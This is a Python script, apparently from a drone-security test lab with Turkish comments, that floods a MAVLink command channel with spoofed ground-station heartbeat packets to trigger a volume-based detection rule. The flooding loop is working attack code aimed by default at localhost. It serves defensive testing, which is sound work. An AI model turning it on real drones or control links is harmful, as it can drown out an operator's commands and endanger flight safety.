#!/usr/bin/env python3
"""
Saldırı #3 — Komut/kontrol kanalı seli (DoS / flood).

Saldırgan, kısa sürede çok sayıda paket göndererek bridge/drone'un komut
kanalını meşgul eder ve gerçek bir operatörün komutlarının fark edilmesini
zorlaştırmaya çalışır. detect/rules.py'deki command_flood kuralı, aynı
kaynaktan belirli bir zaman penceresinde eşik üstü paket geldiğinde alarm
üretir (paketin HEARTBEAT ya da COMMAND_LONG olması önemli değildir — hacim
bazlı bir tespit).

Kullanım:
  python3 attacks/flood.py --target 127.0.0.1:14565 --rate 40 --duration 5
  python3 attacks/flood.py --target 127.0.0.1:14561 --rate 40 --duration 5  # köprüyü atla
"""
import argparse
import time

from pymavlink import mavutil
from pymavlink.dialects.v20 import common as mavlink2

ATTACKER_SYSID = 255
ATTACKER_COMPID = 190


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:14565",
                     help="köprünün GCS komut girişi (veya doğrudan drone 14561)")
    ap.add_argument("--rate", type=float, default=40.0, help="saniyede paket sayısı")
    ap.add_argument("--duration", type=float, default=5.0, help="saniye")
    args = ap.parse_args()

    conn = mavutil.mavlink_connection(
        "udpout:" + args.target, source_system=ATTACKER_SYSID,
        source_component=ATTACKER_COMPID, dialect="common")

    period = 1.0 / args.rate
    end = time.time() + args.duration
    sent = 0
    print(f"[saldiri] flood basliyor -> {args.target} (~{args.rate:.0f}/sn, {args.duration:.0f}sn)")
    while time.time() < end:
        conn.mav.heartbeat_send(
            mavlink2.MAV_TYPE_GCS, mavlink2.MAV_AUTOPILOT_INVALID, 0, 0, 0)
        sent += 1
        time.sleep(period)
    print(f"[saldiri] tamam, {sent} paket gonderildi.")


if __name__ == "__main__":
    main()
